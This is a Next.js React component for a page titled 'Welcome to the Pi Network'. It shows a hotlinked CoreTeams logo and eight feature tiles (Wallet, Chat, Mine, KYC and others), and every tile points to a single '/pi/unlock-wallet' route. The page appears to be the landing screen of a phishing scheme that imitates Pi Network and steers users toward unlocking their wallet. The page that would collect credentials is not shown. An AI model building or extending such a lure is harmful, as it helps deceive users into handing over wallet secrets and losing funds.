"use client";

import Link from "next/link";
import Image from "next/image";
import styles from "./ValidatePage.module.css";
import {
  Blockchain,
  Brainstorm,
  Chat,
  Exchange,
  Fireside,
  Kyc,
  Mine,
  Wallet,
} from "@/component/Pi-icon";

const ValidatePage = () => {
  return (
    <div className={styles.validatePage}>
      {/* Top Bar */}
      <div className={styles.topBar}>
        <div className={styles.topBarContent}>
          <Link href="/" className={styles.withText}>
            Home
          </Link>
          <Image
            src="https://www.coreteams.net/_next/image?url=%2Fimages%2Flogo.png&w=128&q=75"
            alt="CoreTeams Logo"
            className={styles.logo}
            width={128}
            height={40}
          />
        </div>
      </div>

      {/* Main Content */}
      <div className={styles["icon-container"]}>
        <div className={styles["logo-container"]}>
          <Image
            src="https://www.coreteams.net/_next/image?url=%2Fimages%2Flogo.png&w=128&q=75"
            alt="CoreTeams Logo"
            width={128}
            height={40}
          />
        </div>

        <h1 className={styles.welcomeText}>Welcome to the Pi Network</h1>

        <div className={styles.iconsgrid}>
          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Wallet />
            </div>
            <span>Wallet</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Chat />
            </div>
            <span>Chat</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Brainstorm />
            </div>
            <span>Brainstorm</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Mine />
            </div>
            <span>Mine</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Blockchain />
            </div>
            <span>Blockchain</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Exchange />
            </div>
            <span>Pi-Exchange</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Kyc />
            </div>
            <span>KYC</span>
          </Link>

          <Link href="/pi/unlock-wallet" className={styles["icon-item"]}>
            <div className={styles["icon-wrapper"]}>
              <Fireside />
            </div>
            <span>Fireside</span>
          </Link>
        </div>

        <button className={styles["explore-button"]}>
          <span className={styles["button-icon"]}>↗</span>
          Explore our Exchange
        </button>
      </div>
    </div>
  );
};

export default ValidatePage;
